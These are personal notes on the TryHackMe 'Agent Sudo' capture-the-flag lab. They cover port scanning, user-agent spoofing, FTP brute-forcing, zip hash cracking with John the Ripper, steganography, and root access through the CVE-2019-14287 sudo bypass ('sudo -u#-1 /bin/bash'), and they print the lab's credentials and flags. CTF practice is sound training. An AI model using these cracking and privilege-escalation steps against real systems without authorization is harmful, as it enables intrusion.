#tryhackme #ctf 
# Agent Sudo
---

## Nmap
`
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
`

change user agent using the User Agent Switcher add-on (in Firefox) -> use C as user-agent -> agent_C_attention.php

Name: chris -> weak password (brute-force)

## Hydra
found FTP password: crystal

connect to FTP using creds chris:crystal
| found 3 files: To_agentJ.txt, cute-alient.jpg, cutie.png
| To_agentJ.txt -> passwd stored in 1 pic
| real pic stored in agentJ's directory

download `foremost` and use on cutie.png to find a zip file (passwd protected)

Use zip2john to convert zip to hash for john the ripper

`zip2john <zipfile>.zip > hash.txt`

Use john the ripper to brute force using rockyou.txt
`john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt` -> found password `alien`

unzip using passwd: alien -> found file To-agentR.txt

To_agentR.txt -> QXJlYTUx -> decode base64 -> found `Area51`

use online decoder to solve steganography with passwd: Area51 -> found creds james:hackerrules!

ssh using creds james:hackerrules! -> success!
`cat user_flag.txt` -> b03d975e8c92a7c04146cfa7a5a313c7

reverse image seach on google -> found 'Roswell alien autopsy'

`sudo -l` -> found (ALL, !root) /bin/bash -> we can run bash as any user

search `(ALL, !root) /bin/bash exploit` on google -> found CVE-2019-14287

exploit this:
`sudo -u#-1 /bin/bash` -> gained root!

`cat /root/root.txt` -> b53a02f55b57d4439e3341834d70c062 [FLAG]

Agent_R's real name: DesKel